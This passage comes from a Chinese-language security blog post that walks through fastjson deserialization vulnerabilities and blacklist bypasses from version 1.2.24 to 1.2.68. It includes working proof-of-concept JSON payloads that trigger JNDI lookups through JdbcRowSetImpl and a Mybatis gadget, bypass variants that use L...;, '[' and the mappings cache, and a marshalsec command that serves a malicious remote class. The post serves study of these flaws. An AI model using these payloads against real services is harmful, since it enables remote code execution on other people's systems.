class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.crumbling;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC1_2_24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(PoC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开启 <code>RMI</code> 服务器，默认运⾏在 <code>1099</code> 端⼝，并设置返回对象为远程恶意类的引⽤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer</span><br><span class="line">http://127.0.0.1:8000/<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><code>@type</code> ：指定恶意利⽤类为 <code>com.sun.rowset.JdbcRowSetImpl</code></p><p><code>dataSourceName</code> ：指定 <code>RMI / LDAP</code> 恶意服务器，并调⽤ <code>setDataSourceName</code> 函数</p><p><code>autoCommit</code> ：调⽤ <code>setAutoCommit</code> 函数。</p><p>调用链流程：前文提到反序列化会调用目标类的<code>setter/getter</code>方法，<code>JdbcRowSetImpl</code>链在反序列化时就会调用的类中的<code>setAutoCommit()</code>,其中又会调用<code>connect()</code>方法</p><p><code>connect()</code>方法中有如下内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br></pre></td></tr></table></figure><p>其存在JNDI注入，调⽤ lookup 函数，参数可控且为 <code>this.getDataSourceName()</code>，如果这个参数为<code>http://127.0.0.1:8000/Exploit</code>，也就是我们上传的恶意类，那么就可以完成加载利用</p><h2 id="黑名单机制"><a href="#黑名单机制" class="headerlink" title="黑名单机制"></a>黑名单机制</h2><p>官⽅在<code>1.2.25</code>版本更新中，对<code>1.2.25-1.2.41</code>版本漏洞进⾏了修补。新增了 <code>autoTypeSupport</code> 反序列化选项，并通过 <code>checkAutoType</code> 函数对加载类进⾏⿊⽩名单过滤和判断。</p><p>1.2.25版本默认情况下， <code>autoTypeSupport</code> 为 false ，将不⽀持指定类的反序列化，默认使⽤⿊名单 +⽩名单验证。</p><p>运行前面的poc，会得到</p><p><img src="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008162532802.png" alt="image-20241008162532802"></p><p>可以在源码中看到黑名单</p><p><img src="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008162437246.png" alt="image-20241008162437246"></p><p>再看相对应的<code>check</code>函数<code>checkAutoType</code></p><p>代码比较占篇幅，这边说下逻辑：开启了<code>autoType</code>，先后从白名单黑名单里进行判断，如果在白名单中匹配成功，会直接用<code>TypeUtils.loadClass</code>加载，不会进行后续的黑名单匹配，没开就是反过来；如果黑白名单都没有匹配，那么在开启了<code>autoType</code>或者<code>expectClass</code>不为空，也就是指定<code>Class</code>（？）类才会加载。</p><p><img src="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008164652335.png" alt="image-20241008164652335"></p><p>有黑名单机制，那就要考虑绕过，<code>checkAutoType</code>本身的逻辑里没看到可绕过的部分，所以继续去<code>loadClass</code>方法里看看</p><p><img src="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008170254948.png" alt="image-20241008170254948"></p><p>可以看到在第二个<code>else if</code>里写的过滤逻辑，如果类名的字符串以<code>L</code>开头并以<code>;</code>结尾，则需要把开头的<code>L</code>和结尾的<code>;</code>给去掉，然后递归调用<code>loadClass</code></p><p>从源码中可以看到，白名单是默认为空的那么一个比较简单的绕过方法就出来了</p><p>2步</p><ul><li><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></li><li>在指定的类名开头加上 <code>L</code> ，结尾加上 <code>;</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC1_2_25</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"> <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,</span></span><br><span class="line"><span class="string">\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"> JSON.parse(PoC);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check</code>逻辑里还有个<code>[</code>开头也会去循环调用然后加载</p><p>所以相关绕过payload还有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>逻辑来看<code>[&#123;</code>的位置应该是<code>,</code>但是会出现报错，提示token相关的问题，所以最后还是要<code>[&#123;</code></p><h2 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h2><p>在前一次补丁上再次进行修补</p><p>主要改动内容为</p><ul><li>类名变成了哈希值，不过已经有了对应的表格<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL/fastjson-blacklist </a>；</li><li><code>checkAutoType</code>规则增加<img src="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241009103300569.png" alt="image-20241009103300569">可以看到他会进行一次首尾的删除</li></ul><p>所以只需要双写<code>L</code>和<code>;</code>即可继续绕过（根据他循环删除的特性，其实n写也没问题）</p><h2 id="1-2-43绕过"><a href="#1-2-43绕过" class="headerlink" title="1.2.43绕过"></a>1.2.43绕过</h2><p><code>L</code>n写问题彻底解决，但是<code>[</code>的事情还没有搞定</p><h2 id="Mybatis利用链"><a href="#Mybatis利用链" class="headerlink" title="Mybatis利用链"></a>Mybatis利用链</h2><p><code>1.2.44-1.2.45</code>前面提到的问题已经被修复</p><p>这边参考的2个资料开始分叉，一边利用<code>mappings</code>缓存绕过，一边则是<code>Mybatis</code>链</p><p>首先是<code>Mybatis</code>链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;prope rties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">            JSON.parse(PoC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是会去调用<code>POC</code>中传递 <code>properties</code> 成员会调⽤ <code>setProperties</code> ，这里面也调用了<code>lookup</code>函数</p><p><img src="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241009105526685.png" alt="image-20241009105526685"></p><p><code>data_source</code>传入恶意<code>RMI</code>地址，完成加载利用</p><h2 id="利用mappings缓存绕过"><a href="#利用mappings缓存绕过" class="headerlink" title="利用mappings缓存绕过"></a>利用<code>mappings</code>缓存绕过</h2><p><code>1.2.46</code>开始<code>Mybatis</code>的也没了</p><p><code>1.2.47</code></p><p>扣个<code>payload</code>来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理同样出现在<code>checkAutoType</code>，其在不开启autoType的情况下通过利用链将数据放入缓存<code>mappings</code>中，在后续会直接从缓存里取，而不需要进行检验</p><h2 id="1-2-48绕过"><a href="#1-2-48绕过" class="headerlink" title="1.2.48绕过"></a>1.2.48绕过</h2><p><code>1.2.48</code>开始缓存有关的内容已经被修复了</p><p><code>1.2.48-1.2.67</code></p><p>针对黑名单的绕过为主，需要存在有其他组件</p><h2 id="1-2-68绕过"><a href="#1-2-68绕过" class="headerlink" title="1.2.68绕过"></a>1.2.68绕过</h2><p>感觉<code>1.2.68</code>开始这些版本都比较新，后续慢慢总结吧</p><p>更新了<code>safeMode</code>,如果开启了<code>safeMode</code> <code>autoType</code>会被完全禁止，绕过的核心是传入<code>checkAutoType</code>的参数<code>expectClass</code></p><p><img src="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241012163209146.png" alt="image-20241012163209146"></p><p>在前文<code>fastjson</code>的简单使用中<code>Person.class</code>即为<code>expectClass</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(json2,Person.class)</span><br></pre></td></tr></table></figure><p>条件如下：</p><p><code>expectClass</code>为空：</p><ol><li><code>typeNmae</code>不在<code>denyHashCodes</code>黑名单中（必须条件）</li><li><code>SafeMode</code>为<code>false</code>（必要条件，默认为false）</li><li><code>typeName</code>在<code>TypeUtils#mappings</code>中且<code>expectClass</code>为空且<code>typeName</code>不为<code>HashMap</code>且不为 <code>expectClass</code>子类</li></ol><p><code>expectClass</code>不为空：</p><ol><li><code>typeNmae</code>和<code>expectClass</code>均不在<code>denyHashCodes</code>黑名单中（必须条件）</li><li><code>autoTypeSupport</code>为<code>false</code>（默认为false）</li><li><code>expectClass</code>在<code>TypeUtils#mappings</code>中</li><li><code>typeName</code>不是<code>ClassLoader</code>、<code>DataSource</code>、<code>RowSet</code>的子类</li><li><code>expectClass</code>不为null，且不为<code>Object.class</code>、<code>Serializable.class</code>、<code>Cloneable.class</code>、 <code>Closeable.class</code>、<code>EventListener.class</code>、<code>Iterable.class</code>、<code>Collection.class</code></li><li><code>typeName</code>是<code>expectClass</code>的子类</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>知识星球代码审计</p><p><a target="_blank" rel="noopener" href="https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Basic">W01fh4cker/LearnFastjsonVulnFromZero-Basic</a></p></div></div></div><nav id="article-nav"><a class="article-nav-btn left" href="/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/" title="浅谈Redis未授权"><i class="fa-solid fa-angle-left"></i><p class="title-text">浅谈Redis未授权</p></a><a class="article-nav-btn right" href="/2024/06/15/%E5%88%B7%E9%A2%98%E8%AE%B0/" title="刷题记（持续更新中）"><p class="title-text">刷题记（持续更新中）</p><i class="fa-solid fa-angle-right"></i></a></nav></article></div><div id="footer-wrapper"><footer id="footer"><div id="footer-info" class="inner">&copy; 2024 crumbling<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a></div></footer></div><div class="back-to-top-wrapper"><button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()"><span class="material-symbols-rounded">keyboard_arrow_up</span></button></div><script>function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }</script></div><script src="/js/light-dark-switch.js"></script></body></html>